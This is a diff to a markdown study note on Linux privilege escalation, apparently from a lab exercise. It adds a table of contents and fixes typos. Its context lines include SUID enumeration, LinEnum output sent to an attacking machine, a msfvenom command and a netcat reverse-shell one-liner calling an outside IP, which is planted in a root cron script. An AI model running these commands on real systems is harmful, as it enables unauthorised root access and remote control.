@@ -1,5 +1,11 @@
 # Linux Privilege Escalation
 
+## Table of Contents
+
+[Query The System](#query-the-system)
+[Use LinEnum.sh to exfiltrate system information](#linenumsh-to-exfiltrate-the-system-information)
+[use FIND to enumerate potential exploits](#use-find-to-identify-useful-file-properties-and-attributes)
+
 
 ## Initial checklist
 
@@ -26,8 +32,6 @@
 `:> cat /proc/version` : Specifics about the kern verion and the GCC compilers use to build the kernel  
 
 `:> cat /etc/issue` : Contains the pre-login prompt and can be changed
-
-
 
 ### LinEnum.sh to Exfiltrate the system information
 
@@ -111,7 +115,7 @@ Reverse the server setup and transfer the enum.txt to the attacking device for a
 
 ### SUID/GUID  
 
-#### Find exploitable binaries  
+#### Find the exploitable binary(ies)  
 
 `find / -perm -u=s -type f 2>/dev/null`
 
@@ -173,7 +177,7 @@ Switch to user7
 
 `:> su new` and enter the password  
 
-![Complete](assets/Linux-PrivEsc-06-passwd-03.png)  
+![Complete](assets/Linux-PrivEsc-06-passwd-04.png)  
 
 ## Escaping the Vi editor  
 
@@ -201,7 +205,7 @@ Switch to user7
 
 ![find cronjobs](assets/Linux-PrivEsc-08-cron-01.png)
 
-'autoscript.sh' runs with root privilegs
+'autoscript.sh' runs with root privileges
 
 Open the file  
 
@@ -214,8 +218,6 @@ Open the file
 ### Use Metasploit to generate a reverse shell and place into the autoscript.sh  
 
 `:> msfvenom -p cmd/unix/reverse_netcat lhost=<attacker IP> lport=8888 R`  
-
-![payload generated](assets/Linux-PrivEsc-08-cron-04.png)  
 
 mkfifo /tmp/yphto; nc 10.201.16.214 8888 0</tmp/yphto | /bin/sh >/tmp/yphto 2>&1; rm /tmp/  
 
